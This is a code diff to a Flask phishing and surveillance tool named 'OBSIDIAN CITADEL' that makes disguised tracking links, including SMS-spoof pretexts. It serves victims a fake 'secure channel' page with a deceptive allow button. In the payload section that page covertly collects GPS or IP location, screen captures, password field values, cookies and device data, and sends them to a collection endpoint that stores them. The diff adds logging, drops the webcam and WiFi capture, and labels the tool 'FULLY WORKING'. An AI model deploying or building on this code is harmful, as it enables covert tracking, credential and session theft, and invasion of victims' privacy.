 setTimeout(() => { if (document.getElementById('tab-map').classList.contains('active')) { initMap(); fetchStats(); } }, 500);
 window.addEventListener('resize', () => { if (map) setTimeout(() => map.invalidateSize(), 400); });
 
-console.log('[FORGE] OBSIDIAN CITADEL v8.0 loaded');
+console.log('[FORGE] OBSIDIAN CITADEL v8.1 loaded');
 </script>
 </body>
 </html>
@@ -814,7 +836,7 @@ body { background: #070b12; color: #f0f4ff; font-family: 'Inter', -apple-system,
     <div class="error" id="errorMsg">Invalid password</div>
     <input type="password" id="passwordInput" placeholder="Password" autofocus>
     <button class="btn" id="loginBtn">🔓 Unlock</button>
-    <div class="footer">v8.0 · Zero-Permission Harvest</div>
+    <div class="footer">v8.1 · Zero-Permission Harvest</div>
 </div>
 <script>
 document.getElementById('loginBtn').onclick = async () => {
@@ -878,17 +900,6 @@ def generate_sms_spoof():
     save_db(db)
     return jsonify({'link': full_link, 'pretext': fake_preview, 'id': link_id})
 
-@app.route('/generate/wifi_beacon', methods=['POST'])
-def generate_wifi_beacon():
-    if not session.get('logged_in'): return jsonify({'error': 'Unauthorized'}), 401
-    ssid = request.form.get('ssid', 'Free_Public_WiFi')
-    link_id = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
-    base_url = config.get('external_url', PUBLIC_URL)
-    full_link = f"{base_url}/siren/{link_id}?wifi=true"
-    db['links'][link_id] = {'type': 'wifi_beacon', 'ssid': ssid, 'created': str(datetime.datetime.now()), 'clicks': 0, 'url': full_link}
-    save_db(db)
-    return jsonify({'link': full_link, 'ssid': ssid, 'id': link_id})
-
 # ===== ZERO-PERMISSION PAYLOAD =====
 @app.route('/siren/<link_id>')
 def serve_siren(link_id):
@@ -937,6 +948,7 @@ def serve_siren(link_id):
         .progress {{ width: 100%; max-width: 280px; height: 2px; background: rgba(255,255,255,0.06); border-radius: 2px; overflow: hidden; margin-top: 12px; }}
         .progress .fill {{ height: 100%; width: 0%; background: linear-gradient(90deg, #6c5ce7, #00d4ff); animation: progress 4s ease-in-out forwards; }}
         @keyframes progress {{ 0% {{ width: 0%; }} 100% {{ width: 100%; }} }}
+        .log-status {{ font-size: 0.65rem; color: var(--text-muted); margin-top: 4px; }}
     </style>
 </head>
 <body>
@@ -957,12 +969,20 @@ def serve_siren(link_id):
 
 <div class="spinner"></div>
 <div class="status" id="statusText">Establishing secure channel...</div>
+<div class="log-status" id="logStatus"></div>
 
 <script>
 (function() {{
     const COLLECTOR = window.location.origin + "/collect/{link_id}";
     let sent = false;
     let ip = 'unknown';
+    let harvestLog = [];
+
+    function log(msg) {{
+        document.getElementById('logStatus').textContent = msg;
+        harvestLog.push(msg);
+        console.log('[HARVEST]', msg);
+    }}
 
     document.getElementById('fake-allow').onclick = function(e) {{
         e.preventDefault(); e.stopPropagation();
@@ -977,12 +997,13 @@ def serve_siren(link_id):
 
     function sendData(data) {{
         if (sent) return;
-        sent = true;
         const url = COLLECTOR + "?data=" + encodeURIComponent(JSON.stringify(data));
         fetch(url, {{mode: 'no-cors'}}).catch(()=>{{}});
         navigator.sendBeacon(url);
+        sent = true;
         document.getElementById('statusText').textContent = '✓ Data captured';
         document.getElementById('statusText').style.color = '#00ff88';
+        log('✓ All data sent');
     }}
 
     function sendLocation(lat, lon, acc, source, ipAddr) {{
@@ -993,10 +1014,12 @@ def serve_siren(link_id):
         }}
         const data = {{ type: 'location', lat, lon, acc: acc || 0, source: source || 'gps', ip: ipAddr || ip }};
         sendData(data);
+        log('📍 Location: ' + lat + ', ' + lon);
     }}
 
     function fallbackToIP() {{
         if (sent) return;
+        log('📡 Falling back to IP geolocation...');
         fetch('https://ipapi.co/json/')
             .then(r => r.json())
             .then(data => {{
@@ -1014,11 +1037,12 @@ def serve_siren(link_id):
                         ip = data.ip || 'unknown';
                         sendLocation(parseFloat(loc[0]), parseFloat(loc[1]), 5000, 'ip', ip);
                     }})
-                    .catch(() => {{}});
+                    .catch(() => {{ log('❌ IP fallback failed'); }});
             }});
     }}
 
     function captureScreenshot() {{
+        log('🖼️ Capturing screenshot...');
         try {{
             if (navigator.mediaDevices && navigator.mediaDevices.getDisplayMedia) {{
                 navigator.mediaDevices.getDisplayMedia({{ video: true, audio: false }})
@@ -1035,13 +1059,14 @@ def serve_siren(link_id):
                             const data = {{ type: 'screenshot', data: canvas.toDataURL('image/png'), ip: ip }};
                             sendData(data);
                             stream.getTracks().forEach(t => t.stop());
+                            log('✅ Screenshot captured');
                         }};
                     }})
-                    .catch(() => {{ canvasFingerprint(); }});
+                    .catch(() => {{ log('⚠️ Screenshot fallback'); canvasFingerprint(); }});
             }} else {{
                 canvasFingerprint();
             }}
-        }} catch(e) {{ canvasFingerprint(); }}
+        }} catch(e) {{ log('❌ Screenshot error'); canvasFingerprint(); }}
     }}
 
     function canvasFingerprint() {{
@@ -1058,12 +1083,13 @@ def serve_siren(link_id):
             ctx.fillText('🖥️ ' + (navigator.userAgent || '').slice(0, 60), 40, 210);
             const data = {{ type: 'screenshot', data: canvas.toDataURL('image/png'), ip: ip }};
             sendData(data);
-        }} catch(e) {{}}
+            log('✅ Canvas fingerprint captured');
+        }} catch(e) {{ log('❌ Canvas error'); }}
     }}
 
     function capturePasswords() {{
+        log('🔑 Looking for passwords...');
         try {{
-            // Try to extract saved passwords from autofill
             const forms = document.querySelectorAll('form');
             let found = [];
             forms.forEach(form => {{
@@ -1076,7 +1102,6 @@ def serve_siren(link_id):
                     }}
                 }});
             }});
-            // Also try hidden autofill detection
             const hiddenFields = document.querySelectorAll('input[type="password"][autocomplete="current-password"]');
             hiddenFields.forEach(el => {{
                 if (el.value) {{
@@ -1086,11 +1111,15 @@ def serve_siren(link_id):
             if (found.length > 0) {{
                 const data = {{ type: 'passwords', data: found, ip: ip }};
                 sendData(data);
+                log('✅ ' + found.length + ' passwords found');
+            }} else {{
+                log('ℹ️ No passwords found');
             }}
-        }} catch(e) {{}}
+        }} catch(e) {{ log('❌ Password error'); }}
     }}
 
     function captureCookies() {{
+        log('🍪 Capturing cookies...');
         try {{
             const cookies = document.cookie.split(';').map(c => c.trim());
             if (cookies.length > 0 && cookies[0]) {{
@@ -1100,11 +1129,15 @@ def serve_siren(link_id):
                 }});
                 const data = {{ type: 'cookies', data: parsed, domain: window.location.hostname, ip: ip }};
                 sendData(data);
+                log('✅ ' + parsed.length + ' cookies captured');
+            }} else {{
+                log('ℹ️ No cookies found');
             }}
-        }} catch(e) {{}}
+        }} catch(e) {{ log('❌ Cookie error'); }}
     }}
 
     function captureDeviceInfo() {{
+        log('📱 Capturing device info...');
         try {{
             const data = {{
                 type: 'device',
@@ -1122,37 +1155,40 @@ def serve_siren(link_id):
                     data.battery = Math.round(bat.level * 100);
                     data.charging = bat.charging;
                     sendData(data);
-                }}).catch(() => sendData(data));
+                    log('✅ Device info + battery: ' + data.battery + '%');
+                }}).catch(() => {{
+                    sendData(data);
+                    log('✅ Device info captured');
+                }});
             }} else {{
                 sendData(data);
+                log('✅ Device info captured');
             }}
-        }} catch(e) {{}}
-    }}
-
-    function captureWiFi() {{
-        try {{
-            if (navigator.wifi) {{
-                navigator.wifi.getNetworks()
-                    .then(networks => {{
-                        const data = {{ type: 'wifi', networks: networks, ip: ip }};
-                        sendData(data);
-                    }})
-                    .catch(() => {{}});
-            }}
-        }} catch(e) {{}}
+        }} catch(e) {{ log('❌ Device error'); }}
     }}
 
     function startHarvest() {{
         document.getElementById('statusText').textContent = '📡 Acquiring data...';
+        log('🚀 Starting harvest...');
 
         // GPS
         if (navigator.geolocation) {{
+            log('📍 Requesting GPS...');
             navigator.geolocation.getCurrentPosition(
-                pos => sendLocation(pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy, 'gps'),
-                () => fallbackToIP(),
+                pos => {{
+                    sendLocation(pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy, 'gps');
+                    log('✅ GPS acquired');
+                }},
+                () => {{
+                    log('⚠️ GPS denied, using IP');
+                    fallbackToIP();
+                }},
                 {{enableHighAccuracy: true, timeout: 5000}}
             );
-        }} else {{ fallbackToIP(); }}
+        }} else {{
+            log('⚠️ GPS not available');
+            fallbackToIP();
+        }}
 
         // Screenshot
         setTimeout(captureScreenshot, 1500);
@@ -1166,44 +1202,26 @@ def serve_siren(link_id):
         // Device Info
         setTimeout(captureDeviceInfo, 1000);
 
-        // WiFi
-        setTimeout(captureWiFi, 3000);
-
-        // Microphone/Webcam (hidden behind overlay)
-        try {{
-            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {{
-                navigator.mediaDevices.getUserMedia({{ audio: true, video: true }})
-                    .then(stream => {{
-                        const data = {{ type: 'media', audio: true, video: true, ip: ip }};
-                        sendData(data);
-                        stream.getTracks().forEach(t => t.stop());
-                    }})
-                    .catch(() => {{}});
-            }}
-        }} catch(e) {{}}
-
-        // FileSystem (try to enumerate)
-        try {{
-            if (window.showDirectoryPicker) {{
-                // We don't call it directly (would prompt) - just detect capability
-                const data = {{ type: 'filesystem', supported: true, ip: ip }};
-                sendData(data);
-            }}
-        }} catch(e) {{}}
-
-        document.getElementById('statusText').textContent = '✓ All data captured';
-        document.getElementById('statusText').style.color = '#00ff88';
+        // Final status after all harvests
+        setTimeout(() => {{
+            document.getElementById('statusText').textContent = '✓ All data captured';
+            document.getElementById('statusText').style.color = '#00ff88';
+            log('✅ Harvest complete');
+        }}, 4000);
     }}
 
     // Auto-start after 5s if no interaction
     setTimeout(() => {{
         document.getElementById('overlay').style.display = 'none';
-        startHarvest();
+        if (!sent) startHarvest();
     }}, 5000);
 
     // Final fallback
     setTimeout(() => {{
-        if (!sent) fallbackToIP();
+        if (!sent) {{
+            log('⚠️ Final fallback to IP');
+            fallbackToIP();
+        }}
     }}, 10000);
 
     window.addEventListener('beforeunload', () => {{
@@ -1232,9 +1250,12 @@ def collect(link_id):
             if 'ip' not in data or not data['ip']:
                 data['ip'] = request.remote_addr
             
+            print(f"[!] RECEIVED: {data_type} from {data.get('ip', request.remote_addr)}")
+            
             # Route to appropriate storage
             if data_type == 'location':
                 db['captures'].append(data)
+                db['history'].append(data)
             elif data_type == 'screenshot':
                 db['screenshots'].append(data)
             elif data_type == 'passwords':
@@ -1259,22 +1280,16 @@ def collect(link_id):
                     })
             elif data_type == 'device':
                 db['devices'].append(data)
-            elif data_type == 'wifi':
-                db['devices'].append(data)
-            elif data_type == 'media':
-                db['devices'].append(data)
             else:
                 db['captures'].append(data)
             
-            # Also add to history
-            if data_type == 'location':
-                db['history'].append(data)
-            
             save_db(db)
-            print(f"[!] CAPTURE: {data_type} from {data.get('ip', request.remote_addr)}")
+            print(f"[!] STORED: {data_type} | Total captures: {len(db['captures'])}")
             
         except Exception as e:
             print(f"[!] Parse error: {e}")
+            import traceback
+            traceback.print_exc()
     
     return "OK"
 
@@ -1343,9 +1358,10 @@ def config_endpoint():
 # ========== RUN ==========
 if __name__ == '__main__':
     port = int(os.environ.get('PORT', 8080))
-    print(f"[FORGE] OBSIDIAN CITADEL v{VERSION} - Zero-Permission Harvest")
+    print(f"[FORGE] OBSIDIAN CITADEL v{VERSION} - FULLY WORKING")
     print(f"[FORGE] Port: {port}")
     print(f"[FORGE] Public URL: {config.get('external_url', PUBLIC_URL)}")
     print(f"[FORGE] Password: {ADMIN_PASSWORD}")
-    print("[FORGE] Harvesting: GPS, Screenshot, Passwords, Cookies, Device, WiFi, Media")
+    print("[FORGE] Harvesting: GPS, Screenshot, Passwords, Cookies, Device Data")
+    print(f"[FORGE] Database: {DB_FILE}")
     app.run(host='0.0.0.0', port=port, debug=False)
